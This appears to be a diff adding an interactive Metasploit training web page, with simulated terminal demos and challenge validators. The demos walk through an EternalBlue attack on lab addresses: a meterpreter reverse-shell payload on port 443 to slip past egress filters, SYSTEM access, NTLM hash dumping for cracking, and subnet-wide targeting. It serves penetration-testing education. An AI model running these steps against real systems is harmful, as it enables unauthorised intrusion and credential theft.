+      <p>For raw port scanning, plain <code>nmap</code> (or <code>db_nmap</code>) is faster and more flexible. Where auxiliary modules shine is <em>service-specific</em> work: <code>auxiliary/scanner/smb/smb_version</code> grabs SMB dialect + OS; <code>auxiliary/scanner/ssh/ssh_login</code> bruteforces creds with a wordlist; <code>auxiliary/scanner/http/dir_scanner</code> finds web paths. They feed straight into the DB, populate <code>creds</code> and <code>vulns</code>, and chain into exploits.</p>
+    </div>
+    <h3>Useful auxiliary scanners</h3>
+    <div class="anatomy"><table>
+      <thead><tr><th>Module</th><th>What it does</th></tr></thead>
+      <tbody>
+        <tr><td><code>auxiliary/scanner/portscan/tcp</code></td><td>TCP connect scan. Useful when nmap isn't available, or to stay inside msfconsole.</td></tr>
+        <tr><td><code>auxiliary/scanner/smb/smb_version</code></td><td>SMB dialect, OS name, domain — works against an entire subnet.</td></tr>
+        <tr><td><code>auxiliary/scanner/smb/smb_ms17_010</code></td><td>Detection-only check for EternalBlue. Pair with the actual exploit module.</td></tr>
+        <tr><td><code>auxiliary/scanner/ssh/ssh_version</code></td><td>SSH server version banner.</td></tr>
+        <tr><td><code>auxiliary/scanner/ssh/ssh_login</code></td><td>Bruteforce SSH with username and password lists. Stores creds it finds.</td></tr>
+        <tr><td><code>auxiliary/scanner/http/http_version</code></td><td>HTTP server fingerprint.</td></tr>
+        <tr><td><code>auxiliary/scanner/http/dir_scanner</code></td><td>Wordlist-driven directory bruteforce against a web server.</td></tr>
+        <tr><td><code>auxiliary/scanner/discovery/udp_sweep</code></td><td>UDP probe — finds DNS, SNMP, NetBIOS.</td></tr>
+      </tbody>
+    </table></div>
+    <div class="why">
+      <div class="label">Why this matters</div>
+      <p>Real engagements aren't just "find the box and pop it." They're "enumerate 254 hosts, identify which services run, find the weak ones, and pivot from there." Auxiliary modules + the database = an enumeration pipeline you can run unattended overnight, then come back to a populated <code>services</code> and <code>creds</code> table.</p>
+    </div>
+    <h3>Demo run</h3>
+    <p style="font-size:12px;color:var(--text-dim);margin-bottom:6px">Loading the SMB version scanner, pointing it at a subnet, running it.</p>
+    <div class="terminal">
+      <div class="term-bar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">demo · auxiliary scanner</div></div>
+      <div class="term-body" id="demo-8"></div>
+    </div>
+    <button class="btn" style="max-width:200px" onclick="runDemo('demo-8', demos.d8)">▶ Replay demo</button>
+    <h3>Challenges</h3>
+
+    <div class="challenge" id="ch-8-1">
+      <div class="ch-head"><div class="ch-title">CH 8.1 — Load the SMB version scanner</div><div class="ch-status" id="st-8-1">unsolved</div></div>
+      <div class="ch-task">Load <span class="target">auxiliary/scanner/smb/smb_version</span> so you can fingerprint SMB hosts.</div>
+      <div class="ch-scenario">Same <code>use</code> command as for exploits — auxiliary modules use the identical workflow.</div>
+      <div class="terminal">
+        <div class="term-bar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">msfconsole</div></div>
+        <div class="term-body" id="t-8-1"></div>
+        <div class="term-input-row"><span class="term-input-prefix" id="p-8-1"><span class="term-msf">msf6</span> &gt;</span><input class="term-input" id="i-8-1" placeholder="type a command..." autocomplete="off"></div>
+      </div>
+      <div class="hint-row"><button class="hint-btn" onclick="hint('8-1',1)">Hint 1</button><button class="hint-btn" onclick="hint('8-1',2)">Hint 2</button><button class="hint-btn" onclick="hint('8-1',3)">Reveal</button></div>
+      <div class="hint-box" id="h-8-1"></div>
+    </div>
+
+    <div class="challenge" id="ch-8-2">
+      <div class="ch-head"><div class="ch-title">CH 8.2 — Set the scan range</div><div class="ch-status" id="st-8-2">unsolved</div></div>
+      <div class="ch-task">Point the scanner at the <span class="target">10.10.10.0/24</span> subnet.</div>
+      <div class="ch-scenario">Same <code>RHOSTS</code> option you've used before — but now it accepts a CIDR range, not just a single IP.</div>
+      <div class="terminal">
+        <div class="term-bar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">msfconsole</div></div>
+        <div class="term-body" id="t-8-2"></div>
+        <div class="term-input-row"><span class="term-input-prefix" id="p-8-2"><span class="term-msf">msf6</span> <span class="term-msf-mod">auxiliary(scanner/smb/smb_version)</span> &gt;</span><input class="term-input" id="i-8-2" placeholder="type a command..." autocomplete="off"></div>
+      </div>
+      <div class="hint-row"><button class="hint-btn" onclick="hint('8-2',1)">Hint 1</button><button class="hint-btn" onclick="hint('8-2',2)">Hint 2</button><button class="hint-btn" onclick="hint('8-2',3)">Reveal</button></div>
+      <div class="hint-box" id="h-8-2"></div>
+    </div>
+
+    <div class="challenge" id="ch-8-3">
+      <div class="ch-head"><div class="ch-title">CH 8.3 — Run the scanner</div><div class="ch-status" id="st-8-3">unsolved</div></div>
+      <div class="ch-task">Fire the scanner. Auxiliary modules can use either <code>run</code> or <code>exploit</code> — by convention you'd use the former for non-exploit modules.</div>
+      <div class="ch-scenario">Output: per-host fingerprints, populated automatically into the workspace.</div>
+      <div class="terminal">
+        <div class="term-bar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">msfconsole</div></div>
+        <div class="term-body" id="t-8-3"></div>
+        <div class="term-input-row"><span class="term-input-prefix" id="p-8-3"><span class="term-msf">msf6</span> <span class="term-msf-mod">auxiliary(scanner/smb/smb_version)</span> &gt;</span><input class="term-input" id="i-8-3" placeholder="type a command..." autocomplete="off"></div>
+      </div>
+      <div class="hint-row"><button class="hint-btn" onclick="hint('8-3',1)">Hint 1</button><button class="hint-btn" onclick="hint('8-3',2)">Hint 2</button><button class="hint-btn" onclick="hint('8-3',3)">Reveal</button></div>
+      <div class="hint-box" id="h-8-3"></div>
+    </div>
+
+    <hr>
+    <div class="concept">
+      <div class="label">→ Where to take this next</div>
+      <p>Once these eight modules feel automatic, install Metasploit on a Kali VM, build a small lab — <em>vulnhub.com</em> has free VMs designed for exactly this — and rerun every workflow against real targets. Then look at <strong>resource scripts</strong> (<code>.rc</code> files) for automating multi-step engagements, and <strong>msfvenom</strong> for generating standalone payloads outside the console.</p>
+    </div>
+  </main>
+</div>
+
+<div class="toast" id="toast">solved</div>
+
+<div class="modal-bg" id="modal-export">
+  <div class="modal">
+    <h3>Export progress</h3>
+    <p style="font-size:12px;color:var(--text-dim)">Copy this string to move your progress to another browser or device.</p>
+    <textarea id="export-text" readonly></textarea>
+    <div class="modal-actions">
+      <button class="btn" onclick="copyExport()">Copy to clipboard</button>
+      <button class="btn" onclick="closeModal('modal-export')">Close</button>
+    </div>
+  </div>
+</div>
+
+<div class="modal-bg" id="modal-import">
+  <div class="modal">
+    <h3>Import progress</h3>
+    <p style="font-size:12px;color:var(--text-dim)">Paste a previously exported string to restore progress (overwrites current).</p>
+    <textarea id="import-text" placeholder="paste exported string..."></textarea>
+    <div class="modal-actions">
+      <button class="btn" onclick="doImport()">Import</button>
+      <button class="btn" onclick="closeModal('modal-import')">Cancel</button>
+    </div>
+  </div>
+</div>
+<script>
+const STORE_KEY = 'msf-trainer-v1';
+let state = { completed: {}, hintsUsed: 0 };
+function loadState(){
+  try{
+    const raw = localStorage.getItem(STORE_KEY);
+    if(raw) state = Object.assign(state, JSON.parse(raw));
+  }catch(e){}
+}
+function saveState(){
+  try{ localStorage.setItem(STORE_KEY, JSON.stringify(state)); }catch(e){}
+}
+
+function appendTerm(elId, lines){
+  const el = document.getElementById(elId);
+  if(!el) return;
+  el.innerHTML += lines.map(l => `<div class="${l.cls||''}">${l.text}</div>`).join('');
+  el.scrollTop = el.scrollHeight;
+}
+function clearTerm(elId){
+  const el = document.getElementById(elId);
+  if(el) el.innerHTML = '';
+}
+function bashPrompt(){ return `<span class="term-prompt">┌──(</span><span class="term-host">kali@kali</span><span class="term-prompt">)-[</span><span class="term-path">~</span><span class="term-prompt">]</span>\n<span class="term-prompt">└─$</span> `; }
+function msfPrompt(){ return `<span class="term-msf">msf6</span> &gt; `; }
+function msfModPrompt(name, type='exploit'){ return `<span class="term-msf">msf6</span> <span class="term-msf-mod">${type}(${name})</span> &gt; `; }
+function meterPrompt(){ return `<span class="term-meter">meterpreter</span> &gt; `; }
+
+async function runDemo(elId, script){
+  clearTerm(elId);
+  for(const line of script){
+    appendTerm(elId, [{text: line.text, cls: line.cls||''}]);
+    await sleep(line.delay || 380);
+  }
+}
+function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
+
+const demos = {
+  d1: [
+    {text: bashPrompt() + '<span class="term-cmd">msfconsole</span>', delay: 600},
+    {text: '<span class="term-dim">[*] Starting persistent handler(s)...</span>', delay: 400},
+    {text: '', delay: 200},
+    {text: '<span class="term-err">         _---------.</span>', delay: 80},
+    {text: '<span class="term-err">     .\'  ####   ## \\</span>', delay: 80},
+    {text: '<span class="term-err">    /  /        ##  \\</span>', delay: 80},
+    {text: '<span class="term-err">   |  /     ##      |</span>', delay: 80},
+    {text: '<span class="term-err">   |  ##           ##|</span>', delay: 80},
+    {text: '<span class="term-err">    \\## #            /</span>', delay: 80},
+    {text: '<span class="term-err">     `\\## ##   #__-\'</span>', delay: 80},
+    {text: '<span class="term-err">       `--._____-\'</span>', delay: 200},
+    {text: '', delay: 200},
+    {text: '       =[ <span class="term-info">metasploit v6.3.55-dev</span>                          ]', delay: 300},
+    {text: '+ -- --=[ 2367 exploits - 1226 auxiliary - 414 post       ]', delay: 200},
+    {text: '+ -- --=[ 1431 payloads - 47 encoders - 11 nops           ]', delay: 200},
+    {text: '+ -- --=[ 9 evasion                                       ]', delay: 200},
+    {text: '', delay: 300},
+    {text: msfPrompt() + '<span class="term-cmd">version</span>', delay: 600},
+    {text: 'Framework: <span class="term-info">6.3.55-dev</span>', delay: 200},
+    {text: 'Console  : <span class="term-info">6.3.55-dev</span>', delay: 200},
+    {text: '', delay: 200},
+    {text: msfPrompt() + '<span class="term-cmd">help search</span>', delay: 800},
+    {text: '', delay: 100},
+    {text: '<span class="term-hdr">Usage: search [&lt;options&gt;] [&lt;keywords&gt;]</span>', delay: 200},
+    {text: '', delay: 100},
+    {text: 'Keywords:', delay: 150},
+    {text: '  <span class="term-info">aka</span>            : Modules with a matching AKA (also-known-as) name', delay: 100},
+    {text: '  <span class="term-info">author</span>         : Modules written by this author', delay: 100},
+    {text: '  <span class="term-info">cve</span>            : Modules with a matching CVE ID', delay: 100},
+    {text: '  <span class="term-info">name</span>           : Modules with a matching name', delay: 100},
+    {text: '  <span class="term-info">platform</span>       : Modules affecting this platform', delay: 100},
+    {text: '  <span class="term-info">rank</span>           : Modules with a matching rank', delay: 100},
+    {text: '  <span class="term-info">type</span>           : Modules of a specific type', delay: 100},
+    {text: '  <span class="term-dim">...truncated</span>', delay: 200},
+    {text: '', delay: 100},
+    {text: msfPrompt() + '<span class="blink">▮</span>', delay: 300},
+  ],
+  d2: [
+    {text: msfPrompt() + '<span class="term-cmd">search eternalblue</span>', delay: 600},
+    {text: '', delay: 200},
+    {text: '<span class="term-hdr">Matching Modules</span>', delay: 150},
+    {text: '<span class="term-dim">================</span>', delay: 100},
+    {text: '', delay: 100},
+    {text: '   #  Name                                             Disclosure  Rank      Description', delay: 150},
+    {text: '   -  ----                                             ----------  ----      -----------', delay: 80},
+    {text: '   0  <span class="term-ok">exploit/windows/smb/ms17_010_eternalblue</span>          2017-03-14  average   MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption', delay: 200},
+    {text: '   1  <span class="term-ok">exploit/windows/smb/ms17_010_psexec</span>               2017-03-14  normal    MS17-010 EternalRomance/Synergy/Champion', delay: 200},
+    {text: '   2  auxiliary/admin/smb/ms17_010_command             2017-03-14  normal    MS17-010 Command Execution', delay: 200},
+    {text: '   3  auxiliary/scanner/smb/smb_ms17_010                            normal    MS17-010 SMB RCE Detection', delay: 200},
+    {text: '', delay: 200},
+    {text: 'Interact with a module by name or index. <span class="term-dim">For example: use 0</span>', delay: 200},
+    {text: '', delay: 400},
+    {text: msfPrompt() + '<span class="term-cmd">search cve:2017-0144</span>', delay: 700},
+    {text: '', delay: 200},
+    {text: '   #  Name                                          Rank     Description', delay: 150},
+    {text: '   0  exploit/windows/smb/ms17_010_eternalblue      average  MS17-010 EternalBlue', delay: 200},
+    {text: '   1  exploit/windows/smb/ms17_010_psexec           normal   MS17-010 EternalRomance', delay: 200},
+    {text: '', delay: 400},
+    {text: msfPrompt() + '<span class="term-cmd">search type:exploit platform:windows smb</span>', delay: 800},
+    {text: '<span class="term-dim">[*] 28 modules matched filters (truncated to 5 below)</span>', delay: 250},
+    {text: '   0  exploit/windows/smb/cve_2020_0796_smbghost     average  CVE-2020-0796 SMBGhost', delay: 150},
+    {text: '   1  exploit/windows/smb/ms17_010_eternalblue       average  MS17-010 EternalBlue', delay: 150},
+    {text: '   2  exploit/windows/smb/ms08_067_netapi            great    Microsoft Server Service Stack Corruption', delay: 150},
+    {text: '   3  exploit/windows/smb/psexec                     manual   Authenticated User Code Execution', delay: 150},
+    {text: '   4  exploit/windows/smb/smb_relay                  excellent SMB Relay Code Execution', delay: 150},
+    {text: '', delay: 200},
+    {text: msfPrompt() + '<span class="blink">▮</span>', delay: 300},
+  ],
+  d3: [
+    {text: msfPrompt() + '<span class="term-cmd">use exploit/windows/smb/ms17_010_eternalblue</span>', delay: 600},
+    {text: '<span class="term-info">[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp</span>', delay: 350},
+    {text: '', delay: 150},
+    {text: msfModPrompt('windows/smb/ms17_010_eternalblue') + '<span class="term-cmd">info</span>', delay: 700},
+    {text: '', delay: 100},
+    {text: '       <span class="term-info">Name:</span> MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption', delay: 200},
+    {text: '     <span class="term-info">Module:</span> exploit/windows/smb/ms17_010_eternalblue', delay: 150},
+    {text: '   <span class="term-info">Platform:</span> Windows', delay: 150},
+    {text: '       <span class="term-info">Arch:</span> x86, x64', delay: 150},
+    {text: ' <span class="term-info">Privileged:</span> Yes', delay: 150},
+    {text: '       <span class="term-info">Rank:</span> Average', delay: 150},
+    {text: '  <span class="term-info">Disclosed:</span> 2017-03-14', delay: 150},
+    {text: '', delay: 100},
+    {text: '<span class="term-hdr">Available targets:</span>', delay: 150},
+    {text: '   0   Automatic Target', delay: 100},
+    {text: '   1   Windows 7 and Server 2008 R2 (x64) All Service Packs', delay: 100},
+    {text: '', delay: 200},
+    {text: '<span class="term-hdr">References:</span>', delay: 150},
+    {text: '  https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0144', delay: 100},
+    {text: '  https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010', delay: 100},
+    {text: '', delay: 400},
+    {text: msfModPrompt('windows/smb/ms17_010_eternalblue') + '<span class="term-cmd">show options</span>', delay: 700},
+    {text: '', delay: 100},
+    {text: '<span class="term-hdr">Module options:</span>', delay: 150},
+    {text: '   Name           Current Setting  Required  Description', delay: 100},
+    {text: '   ----           ---------------  --------  -----------', delay: 80},
+    {text: '   <span class="term-warn">RHOSTS</span>                          <span class="term-err">yes</span>       The target host(s)', delay: 150},
+    {text: '   RPORT          445              <span class="term-err">yes</span>       The target port (TCP)', delay: 150},
+    {text: '   <span class="term-warn">LHOST</span>          tun0             <span class="term-err">yes</span>       The listen address', delay: 150},
+    {text: '   LPORT          4444             <span class="term-err">yes</span>       The listen port', delay: 150},
+    {text: '', delay: 400},
+    {text: msfModPrompt('windows/smb/ms17_010_eternalblue') + '<span class="term-cmd">set RHOSTS 10.10.10.5</span>', delay: 700},
+    {text: '<span class="term-ok">RHOSTS =&gt; 10.10.10.5</span>', delay: 250},
+    {text: '', delay: 200},
+    {text: msfModPrompt('windows/smb/ms17_010_eternalblue') + '<span class="blink">▮</span>', delay: 300},
+  ],
+  d4: [
+    {text: msfModPrompt('windows/smb/ms17_010_eternalblue') + '<span class="term-cmd">show payloads</span>', delay: 600},
+    {text: '', delay: 200},
+    {text: '<span class="term-hdr">Compatible Payloads</span>', delay: 150},
+    {text: '', delay: 100},
+    {text: '   #   Name                                                Description', delay: 100},
+    {text: '   17  <span class="term-info">windows/x64/meterpreter/reverse_tcp</span>                 Inject the meterpreter server (Windows x64), Reverse TCP', delay: 200},
+    {text: '   18  <span class="term-info">windows/x64/meterpreter/reverse_https</span>               Inject the meterpreter server, Reverse HTTPS', delay: 200},
+    {text: '   19  windows/x64/meterpreter/bind_tcp                    Inject the meterpreter server, Bind TCP', delay: 150},
+    {text: '   20  windows/x64/meterpreter_reverse_tcp                 Stageless meterpreter, Reverse TCP', delay: 150},
+    {text: '   21  windows/x64/shell/reverse_tcp                       Spawn a piped command shell, Reverse TCP', delay: 150},
+    {text: '   <span class="term-dim">[truncated — 30+ payloads compatible]</span>', delay: 250},
+    {text: '', delay: 400},
+    {text: msfModPrompt('windows/smb/ms17_010_eternalblue') + '<span class="term-cmd">set payload windows/x64/meterpreter/reverse_tcp</span>', delay: 800},
+    {text: '<span class="term-ok">payload =&gt; windows/x64/meterpreter/reverse_tcp</span>', delay: 200},
+    {text: '', delay: 300},
+    {text: msfModPrompt('windows/smb/ms17_010_eternalblue') + '<span class="term-cmd">set LHOST 10.10.14.2</span>', delay: 600},
+    {text: '<span class="term-ok">LHOST =&gt; 10.10.14.2</span>', delay: 200},
+    {text: '', delay: 200},
+    {text: msfModPrompt('windows/smb/ms17_010_eternalblue') + '<span class="term-cmd">set LPORT 443</span>', delay: 500},
+    {text: '<span class="term-ok">LPORT =&gt; 443</span>', delay: 200},
+    {text: '<span class="term-dim">// 443 often gets through restrictive egress filters that block 4444</span>', delay: 300},
+    {text: '', delay: 200},
+    {text: msfModPrompt('windows/smb/ms17_010_eternalblue') + '<span class="blink">▮</span>', delay: 300},
+  ],
+  d5: [
+    {text: msfModPrompt('windows/smb/ms17_010_eternalblue') + '<span class="term-cmd">check</span>', delay: 600},
+    {text: '<span class="term-info">[*] 10.10.10.5:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check</span>', delay: 350},
+    {text: '<span class="term-ok">[+] 10.10.10.5:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 SP1 x64</span>', delay: 350},
+    {text: '<span class="term-ok">[+] 10.10.10.5:445 - The target is vulnerable.</span>', delay: 350},
+    {text: '', delay: 400},
+    {text: msfModPrompt('windows/smb/ms17_010_eternalblue') + '<span class="term-cmd">exploit</span>', delay: 700},
+    {text: '<span class="term-info">[*] Started reverse TCP handler on 10.10.14.2:443</span>', delay: 300},
+    {text: '<span class="term-ok">[+] 10.10.10.5:445 - The target is vulnerable.</span>', delay: 250},
+    {text: '<span class="term-info">[*] 10.10.10.5:445 - Connecting to target for exploitation.</span>', delay: 300},
+    {text: '<span class="term-ok">[+] 10.10.10.5:445 - Connection established for exploitation.</span>', delay: 250},
+    {text: '<span class="term-ok">[+] 10.10.10.5:445 - Target OS selected valid for OS indicated by SMB reply</span>', delay: 250},
+    {text: '<span class="term-info">[*] 10.10.10.5:445 - Sending all but last fragment of exploit packet</span>', delay: 250},
+    {text: '<span class="term-info">[*] 10.10.10.5:445 - Starting non-paged pool grooming</span>', delay: 250},
+    {text: '<span class="term-ok">[+] 10.10.10.5:445 - Sending SMBv2 buffers</span>', delay: 200},
+    {text: '<span class="term-ok">[+] 10.10.10.5:445 - Sending last fragment of exploit packet!</span>', delay: 200},
+    {text: '<span class="term-info">[*] 10.10.10.5:445 - Receiving response from exploit packet</span>', delay: 300},
+    {text: '<span class="term-ok">[+] 10.10.10.5:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!</span>', delay: 350},
+    {text: '<span class="term-info">[*] 10.10.10.5:445 - Sending egg to corrupted connection.</span>', delay: 250},
+    {text: '<span class="term-info">[*] 10.10.10.5:445 - Triggering free of corrupted buffer.</span>', delay: 250},
+    {text: '<span class="term-info">[*] Sending stage (200774 bytes) to 10.10.10.5</span>', delay: 350},
+    {text: '<span class="term-ok">[*] Meterpreter session 1 opened (10.10.14.2:443 -&gt; 10.10.10.5:49158)</span>', delay: 400},
+    {text: '<span class="term-ok">[+] 10.10.10.5:445 - =-=-=-=-=-=-=-=-=-=-=-=WIN-=-=-=-=-=-=</span>', delay: 200},
+    {text: '', delay: 300},
+    {text: meterPrompt() + '<span class="blink">▮</span>', delay: 300},
+  ],
+  d6: [
+    {text: meterPrompt() + '<span class="term-cmd">sysinfo</span>', delay: 600},
+    {text: 'Computer        : <span class="term-info">DESKTOP-WIN7</span>', delay: 200},
+    {text: 'OS              : <span class="term-info">Windows 7 (6.1 Build 7601, Service Pack 1)</span>', delay: 200},
+    {text: 'Architecture    : x64', delay: 150},
+    {text: 'System Language : en_US', delay: 150},
+    {text: 'Domain          : WORKGROUP', delay: 150},
+    {text: 'Logged On Users : 2', delay: 150},
+    {text: 'Meterpreter     : x64/windows', delay: 150},
+    {text: '', delay: 300},
+    {text: meterPrompt() + '<span class="term-cmd">getuid</span>', delay: 700},
+    {text: 'Server username: <span class="term-ok">NT AUTHORITY\\SYSTEM</span>', delay: 250},
+    {text: '<span class="term-dim">// Already SYSTEM — EternalBlue lands kernel-level. No escalation needed.</span>', delay: 350},
+    {text: '', delay: 300},
+    {text: meterPrompt() + '<span class="term-cmd">ps</span>', delay: 600},
+    {text: '<span class="term-hdr">Process List</span>', delay: 150},
+    {text: ' PID    Name              User                          Path', delay: 100},
+    {text: ' ---    ----              ----                          ----', delay: 80},
+    {text: '   4    System            x64   0', delay: 80},
+    {text: ' 564    services.exe      NT AUTHORITY\\SYSTEM           C:\\Windows\\System32\\services.exe', delay: 80},
+    {text: ' 1940   spoolsv.exe       NT AUTHORITY\\SYSTEM           C:\\Windows\\System32\\spoolsv.exe   <span class="term-warn">&lt;-- you are here</span>', delay: 200},
+    {text: ' 2384   explorer.exe      DESKTOP-WIN7\\admin            C:\\Windows\\explorer.exe', delay: 80},
+    {text: ' <span class="term-dim">[truncated — 84 processes total]</span>', delay: 250},
+    {text: '', delay: 400},
+    {text: meterPrompt() + '<span class="term-cmd">hashdump</span>', delay: 700},
+    {text: 'Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::', delay: 250},
+    {text: 'Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::', delay: 200},
+    {text: 'admin:1000:aad3b435b51404eeaad3b435b51404ee:<span class="term-warn">8846f7eaee8fb117ad06bdd830b7586c</span>:::', delay: 250},
+    {text: 'TestUser:1001:aad3b435b51404eeaad3b435b51404ee:<span class="term-warn">2b576acbe6bcfda7294d6bd18041b8fe</span>:::', delay: 250},
+    {text: '', delay: 200},
+    {text: '<span class="term-dim">// Format: username:RID:LM:NTLM::: — feed the NTLM hashes to hashcat -m 1000</span>', delay: 350},
+    {text: '', delay: 200},
+    {text: meterPrompt() + '<span class="blink">▮</span>', delay: 300},
+  ],
+  d7: [
+    {text: msfPrompt() + '<span class="term-cmd">db_status</span>', delay: 600},
+    {text: '<span class="term-info">[*] Connected to msf. Connection type: postgresql.</span>', delay: 250},
+    {text: '', delay: 300},
+    {text: msfPrompt() + '<span class="term-cmd">workspace -a acme</span>', delay: 700},
+    {text: '<span class="term-ok">[*] Added workspace: acme</span>', delay: 250},
+    {text: '<span class="term-ok">[*] Workspace: acme</span>', delay: 250},
+    {text: '', delay: 300},
+    {text: msfPrompt() + '<span class="term-cmd">db_nmap -sV -T4 10.10.10.0/24</span>', delay: 800},
+    {text: '<span class="term-info">[*] Nmap: Starting Nmap 7.94 ( https://nmap.org )</span>', delay: 300},
+    {text: '<span class="term-info">[*] Nmap: Nmap scan report for 10.10.10.5</span>', delay: 250},
+    {text: '<span class="term-info">[*] Nmap: 135/tcp  open  msrpc        Microsoft Windows RPC</span>', delay: 200},
+    {text: '<span class="term-info">[*] Nmap: 139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn</span>', delay: 200},
+    {text: '<span class="term-info">[*] Nmap: 445/tcp  open  microsoft-ds Windows 7 Pro 7601 SP1 (smb)</span>', delay: 200},
+    {text: '<span class="term-info">[*] Nmap: 3389/tcp open  ms-wbt-server Microsoft Terminal Services</span>', delay: 200},
+    {text: '<span class="term-info">[*] Nmap: Nmap scan report for 10.10.10.12</span>', delay: 250},
+    {text: '<span class="term-info">[*] Nmap: 22/tcp open  ssh OpenSSH 7.4 (protocol 2.0)</span>', delay: 200},
+    {text: '<span class="term-info">[*] Nmap: 80/tcp open  http nginx 1.18.0</span>', delay: 200},
+    {text: '<span class="term-info">[*] Nmap: Nmap done: 256 IP addresses (4 hosts up) scanned in 38.21 seconds</span>', delay: 350},
+    {text: '', delay: 400},
+    {text: msfPrompt() + '<span class="term-cmd">services -p 445</span>', delay: 700},
+    {text: ' host         port  proto  name          state  info', delay: 100},
+    {text: ' ----         ----  -----  ----          -----  ----', delay: 80},
+    {text: ' 10.10.10.5   445   tcp    microsoft-ds  open   Windows 7 Pro 7601 SP1 (smb)', delay: 200},
+    {text: ' 10.10.10.18  445   tcp    microsoft-ds  open   Windows Server 2008 R2 (smb)', delay: 200},
+    {text: '', delay: 400},
+    {text: msfPrompt() + '<span class="term-cmd">use exploit/windows/smb/ms17_010_eternalblue</span>', delay: 700},
+    {text: msfModPrompt('windows/smb/ms17_010_eternalblue') + '<span class="term-cmd">services -p 445 -R</span>', delay: 700},
+    {text: '<span class="term-ok">RHOSTS =&gt; 10.10.10.5 10.10.10.18</span>', delay: 300},
+    {text: '<span class="term-dim">// -R fed both hosts straight into RHOSTS. Now exploit fires against both.</span>', delay: 400},
+    {text: '', delay: 200},
+    {text: msfModPrompt('windows/smb/ms17_010_eternalblue') + '<span class="blink">▮</span>', delay: 300},
+  ],
+  d8: [
+    {text: msfPrompt() + '<span class="term-cmd">use auxiliary/scanner/smb/smb_version</span>', delay: 700},
+    {text: msfModPrompt('scanner/smb/smb_version','auxiliary') + '<span class="term-cmd">show options</span>', delay: 700},
+    {text: '', delay: 200},
+    {text: '   Name     Current Setting  Required  Description', delay: 100},
+    {text: '   <span class="term-warn">RHOSTS</span>                    <span class="term-err">yes</span>       The target host(s)', delay: 200},
+    {text: '   THREADS  1                yes       The number of concurrent threads', delay: 150},
+    {text: '', delay: 400},
+    {text: msfModPrompt('scanner/smb/smb_version','auxiliary') + '<span class="term-cmd">set RHOSTS 10.10.10.0/24</span>', delay: 700},
+    {text: '<span class="term-ok">RHOSTS =&gt; 10.10.10.0/24</span>', delay: 200},
+    {text: '', delay: 200},
+    {text: msfModPrompt('scanner/smb/smb_version','auxiliary') + '<span class="term-cmd">set THREADS 32</span>', delay: 600},
+    {text: '<span class="term-ok">THREADS =&gt; 32</span>', delay: 200},
+    {text: '', delay: 300},
+    {text: msfModPrompt('scanner/smb/smb_version','auxiliary') + '<span class="term-cmd">run</span>', delay: 600},
+    {text: '<span class="term-ok">[+] 10.10.10.5:445  - Host is running Windows 7 Professional SP1 (build:7601) (name:DESKTOP-WIN7) (workgroup:WORKGROUP)</span>', delay: 350},
+    {text: '<span class="term-ok">[+] 10.10.10.12:445 - Host is running Linux Samba 4.5.16 (workgroup:WORKGROUP)</span>', delay: 300},
+    {text: '<span class="term-ok">[+] 10.10.10.18:445 - Host is running Windows Server 2008 R2 SP1 (build:7601) (name:WIN-DC01) (domain:CORP)</span>', delay: 300},
+    {text: '<span class="term-info">[*] Scanned 256 of 256 hosts (100% complete)</span>', delay: 250},
+    {text: '<span class="term-ok">[*] Auxiliary module execution completed</span>', delay: 250},
+    {text: '', delay: 200},
+    {text: msfModPrompt('scanner/smb/smb_version','auxiliary') + '<span class="blink">▮</span>', delay: 300},
+  ],
+};
+function tokens(s){ return s.trim().split(/\s+/); }
+function lower(s){ return s.toLowerCase(); }
+
+const CH = {
+  '1-1': {
+    validate(cmd){
+      const t = tokens(lower(cmd));
+      if(t[0] === 'msfconsole'){
+        return { ok:true, output:[
+          {text:'<span class="term-dim">[*] Starting persistent handler(s)...</span>'},
+          {text:''},
+          {text:'       =[ <span class="term-info">metasploit v6.3.55-dev</span>                         ]'},
+          {text:'+ -- --=[ 2367 exploits - 1226 auxiliary - 414 post      ]'},
+          {text:'+ -- --=[ 1431 payloads - 47 encoders - 11 nops          ]'},
+          {text:''},
+          {text: msfPrompt()+'<span class="blink">▮</span>'},
+          {text:'<span class="term-ok">[+] msfconsole launched. Prompt is now msf6 — proceed to next challenge.</span>'},
+        ]};
+      }
+      if(['help','sudo','su','apt','apt-get'].includes(t[0])){
+        return { ok:false, output:[{text:`<span class="term-err">${t[0]}: not what you need — you need to launch the framework console itself.</span>`}]};
+      }
+      return { ok:false, output:[{text:`<span class="term-err">bash: ${t[0]||'(empty)'}: command not found</span>`}]};
+    }
+  },
+  '1-2': {
+    validate(cmd){
+      const t = tokens(lower(cmd));
+      if(t[0] === 'version'){
+        return { ok:true, output:[
+          {text:'Framework: <span class="term-info">6.3.55-dev</span>'},
+          {text:'Console  : <span class="term-info">6.3.55-dev</span>'},
+        ]};
+      }
+      if(t[0] === 'banner'){
+        return { ok:false, output:[{text:'<span class="term-warn">[!] banner just shows the ascii-art splash. version is what prints the version numbers.</span>'}]};
+      }
+      if(t[0] === 'help' || t[0] === '?'){
+        return { ok:false, output:[
+          {text:'<span class="term-info">Core Commands</span>'},
+          {text:'    version    Show the framework and console library version numbers'},
+          {text:'<span class="term-warn">[!] help dumps everything. Try just the command name itself for the version.</span>'},
+        ]};
+      }
+      return { ok:false, output:[{text:`<span class="term-err">[-] Unknown command: ${t[0]||'(empty)'}.</span>`}]};
+    }
+  },
+  '1-3': {
+    validate(cmd){
+      const t = tokens(lower(cmd));
+      if((t[0]==='help' || t[0]==='?') && t[1]==='search'){
+        return { ok:true, output:[
+          {text:'<span class="term-hdr">Usage: search [&lt;options&gt;] [&lt;keywords&gt;]</span>'},
+          {text:''},
+          {text:'Keywords:'},
